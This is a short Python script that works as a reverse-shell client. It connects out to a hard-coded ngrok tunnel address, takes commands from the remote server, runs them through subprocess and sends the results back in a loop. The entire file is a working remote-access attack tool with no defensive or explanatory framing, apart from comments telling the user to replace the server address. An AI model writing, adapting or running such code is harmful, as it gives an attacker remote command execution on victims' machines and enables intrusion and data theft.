import socket
import subprocess

SERVER_HOST = "6.tcp.eu.ngrok.io"  # Replace with your server's ngrok address
SERVER_PORT = 17843                # Replace with your server's ngrok port
BUFFER_SIZE = 1024                 # Buffer size for sending data

# Create the socket object
s = socket.socket()
# Connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# Receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

# Command execution loop
while True:
    # Receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    
    if command.lower() == "exit":
        # If the command is 'exit', break out of the loop
        break
    
    # Execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # Send the results back to the server
    s.send(output.encode())

# Close client connection
s.close()
